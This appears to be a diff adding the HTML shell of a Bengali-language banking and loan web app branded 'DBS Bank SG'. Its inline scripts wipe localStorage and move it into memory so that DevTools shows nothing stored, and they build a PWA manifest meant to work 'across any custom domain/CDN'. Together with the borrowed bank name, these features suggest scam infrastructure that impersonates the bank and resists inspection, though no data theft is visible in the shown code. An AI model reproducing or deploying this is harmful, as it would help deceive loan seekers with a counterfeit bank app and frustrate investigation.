@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="bn">
+  <head>
+    <meta charset="UTF-8" />
+    <script>
+      // Strict Zero-LocalStorage enforcement:
+      // Guarantee zero persistent data in localStorage (clears cuid, tokens, or any third-party keys)
+      // All data resides safely in volatile in-memory storage, keeping DevTools Local Storage 100% empty.
+      (function() {
+        try {
+          if (typeof window !== 'undefined' && window.localStorage) {
+            var origSetItem = window.Storage.prototype.setItem;
+            var origGetItem = window.Storage.prototype.getItem;
+            var origRemoveItem = window.Storage.prototype.removeItem;
+            var origClear = window.Storage.prototype.clear;
+
+            // Clear physical storage on initial load
+            try { origClear.call(window.localStorage); } catch(e) {}
+
+            var memStore = {};
+
+            window.Storage.prototype.setItem = function(key, val) {
+              if (this === window.localStorage) {
+                memStore[key] = String(val);
+                try { origRemoveItem.call(window.localStorage, key); } catch(e) {}
+                return;
+              }
+              return origSetItem.call(this, key, val);
+            };
+
+            window.Storage.prototype.getItem = function(key) {
+              if (this === window.localStorage) {
+                return Object.prototype.hasOwnProperty.call(memStore, key) ? memStore[key] : null;
+              }
+              return origGetItem.call(this, key);
+            };
+
+            window.Storage.prototype.removeItem = function(key) {
+              if (this === window.localStorage) {
+                delete memStore[key];
+                try { origRemoveItem.call(window.localStorage, key); } catch(e) {}
+                return;
+              }
+              return origRemoveItem.call(this, key);
+            };
+
+            window.Storage.prototype.clear = function() {
+              if (this === window.localStorage) {
+                memStore = {};
+                try { origClear.call(window.localStorage); } catch(e) {}
+                return;
+              }
+              return origClear.call(this);
+            };
+
+            window.Storage.prototype.key = function(index) {
+              if (this === window.localStorage) {
+                var keys = Object.keys(memStore);
+                return keys[index] || null;
+              }
+              return window.Storage.prototype.key.call(this, index);
+            };
+          }
+        } catch(e) {}
+      })();
+    </script>
+    <script>
+      // Intercept and redirect 'unload' event listeners to 'pagehide' to prevent Chrome Permissions Policy violation
+      (function() {
+        try {
+          var origAdd = window.addEventListener;
+          window.addEventListener = function(type, listener, options) {
+            if (type === 'unload') {
+              return origAdd.call(window, 'pagehide', listener, options);
+            }
+            return origAdd.call(window, type, listener, options);
+          };
+          var origRemove = window.removeEventListener;
+          window.removeEventListener = function(type, listener, options) {
+            if (type === 'unload') {
+              return origRemove.call(window, 'pagehide', listener, options);
+            }
+            return origRemove.call(window, type, listener, options);
+          };
+          Object.defineProperty(window, 'onunload', {
+            get: function() { return null; },
+            set: function(fn) {
+              if (typeof fn === 'function') {
+                window.addEventListener('pagehide', fn);
+              }
+            },
+            configurable: true
+          });
+        } catch (e) {
+          // ignore
+        }
+      })();
+    </script>
+    <link rel="icon" type="image/png" href="/favicon.png" />
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <link rel="manifest" href="/manifest.json" />
+    <script>
+      // Guarantee same-origin manifest start_url, scope, and icons across any custom domain/CDN
+      (function() {
+        try {
+          if (typeof window !== 'undefined' && window.location && window.location.origin) {
+            var origin = window.location.origin;
+            var manifestObj = {
+              short_name: "DBS Bank SG",
+              name: "DBS Bank SG - ডিজিটাল ব্যাংকিং ও লোন সেবা",
+              description: "DBS Bank SG অফিসিয়াল মোবাইল ব্যাংকিং ও ডিজিটাল লোন অ্যাপ্লিকেশন",
+              icons: [
+                {
+                  src: origin + "/favicon.png",
+                  sizes: "192x192",
+                  type: "image/png",
+                  purpose: "any"
+                },
+                {
+                  src: origin + "/favicon.png",
+                  sizes: "512x512",
+                  type: "image/png",
+                  purpose: "any maskable"
+                }
+              ],
+              start_url: origin + "/",
+              scope: origin + "/",
+              background_color: "#0f172a",
+              theme_color: "#1e3a8a",
+              display: "standalone",
+              orientation: "portrait"
+            };
+            var blob = new Blob([JSON.stringify(manifestObj)], { type: 'application/manifest+json' });
+            var manifestUrl = URL.createObjectURL(blob);
+            var manifestLink = document.querySelector('link[rel="manifest"]');
+            if (manifestLink) {
+              manifestLink.href = manifestUrl;
+            }
+          }
+        } catch (e) {}
+      })();
+    </script>
+    <meta name="theme-color" content="#1e3a8a" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="apple-mobile-web-app-title" content="DBS Bank SG" />
+    <link rel="apple-touch-icon" href="/favicon.png" />
+    <script>
+      // Register service worker for PWA installability
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', function() {
+          navigator.serviceWorker.register('/sw.js').catch(function(err) {
+            // ignore
+          });
+        });
+      }
+    </script>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;500;600;700&family=Noto+Sans+Bengali:wght@400;500;600;700;800;900&family=Raleway:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+    <title>DBS Bank SG - ডিজিটাল ব্যাংকিং ও লোন সেবা | DBS Bank</title>
+    <meta name="description" content="DBS Bank SG - আপনার আর্থিক নির্ভরতার বিশ্বস্ত ব্যাংকিং সহযোগী। দ্রুত ও সহজ শর্তে ব্যক্তিগত, ব্যবসা, কৃষি ও জরুরি লোন সেবা।" />
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
